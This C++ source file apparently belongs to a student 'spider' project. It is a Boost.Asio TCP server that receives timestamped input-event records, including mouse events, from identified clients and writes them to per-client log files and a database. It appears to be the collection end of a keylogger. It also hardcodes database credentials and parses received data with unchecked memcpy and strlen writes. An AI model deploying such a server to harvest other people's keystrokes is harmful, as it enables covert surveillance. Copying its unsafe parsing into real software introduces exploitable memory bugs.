//
// tcp_connection.cpp for tcp_connection in /home/benamar/cpp_spider/Server
// 
// Made by benamar
// Login   <mahdi.benamar@epitech.eu>
// 
// Started on  Fri Sep 22 19:27:11 2017 benamar
// Last update Mon Oct  2 01:35:41 2017 benamar
//

#include "tcp_connection.hpp"

Client::Client(boost::asio::io_service& io_service)
  : m_socket(io_service)
{
  id = "\0";
  identificate = false;
  DB.Connect("SpiderUser", "Spider", "SpiderDB");
}

void			Client::do_read()
{
  if (identificate == false)
    {
      boost::asio::async_read_until(m_socket, resp, "\0",
				    boost::bind(&Client::first_read,
						shared_from_this(),
						boost::asio::placeholders::error));
    }
  else
    {
      m_socket.async_read_some(boost::asio::buffer(msg, sizeof(Data)),
			       boost::bind(&Client::handle_read_until,
					       shared_from_this(),
					       boost::asio::placeholders::error, boost::asio::placeholders::bytes_transferred)); 
    }
}

void			Client::first_read(const boost::system::error_code& error)
{
  if (!error)
    {
      std::string line;
      
      std::istream is(&resp);
      std::getline(is, line);
      id = line;
      identificate = true;
      std::cout << line << std::endl;
      do_read();
    }
  else
    {
      close();
    }
}

std::string		Client::get_id()
{
  return (id);
}

void			Client::handle_read_until(const boost::system::error_code& error, size_t bytes)
{
  if (!error)
    {
      decrypt_to_log();
      do_read();
    }
  else
    {
      close();
      std::cout << id << " disconnect\n";
    }
  (void)bytes;
}

void			Client::decrypt_to_log()
{
  memcpy(&data, &msg, sizeof(Data));
  std::cout << "Désérialize : " << std::endl;
  std::cout << "->  " << data.Data<< std::endl;
  std::cout << "->  " << data.Timestamp << std::endl;
  std::cout << "--------------------------" << std::endl;
  Send_to_DB();
  write_user_log();
  memset(msg, 0, sizeof(Data));
  memset(&data, 0, sizeof(Data));
  
}

void			Client::write_user_log()
{
  std::ofstream fichier(id + ".log", std::ios::out | std::ios::app);
 
  if(fichier)
    {
      boost::posix_time::ptime timeLocal =
	boost::posix_time::second_clock::local_time();

      fichier << timeLocal << " : " << data.Timestamp << " " << data.Data;
      data.Data[strlen(data.Data)] = ' ';
      fichier << " " << data.Data;
      // data.Data[strlen(data.Data)] = ' ';
      // fichier << " " << data.Data;
      // data.Data[strlen(data.Data)] = ' ';
      // fichier << " " << data.Data;
      // if (data.Type == MOUSE)
      // 	{      
      // 	  data.Data[strlen(data.Data)] = ' ';
      // 	  fichier << " " << data.Data;
      // 	  data.Data[strlen(data.Data)] = ' ';
      // 	  fichier << " " << data.Data;
      // 	}
      fichier << "\n";
      fichier.close();
    }
  else
    std::cerr << "Impossible d'ouvrir le fichier !" << std::endl;
}

void			Client::Send_to_DB()
{
  DB.NewMessage(id, data);  
}

void			Client::Protocole(std::string protocole)
{
  boost::asio::async_write(m_socket, boost::asio::buffer(protocole),
			   boost::bind(&Client::do_read,shared_from_this()));
}

void			Client::close()
{
  m_socket.close();
}

tcp::socket&		Client::socket()
{
  return m_socket;
}

void			Client::start()
{
  do_read();
}
 
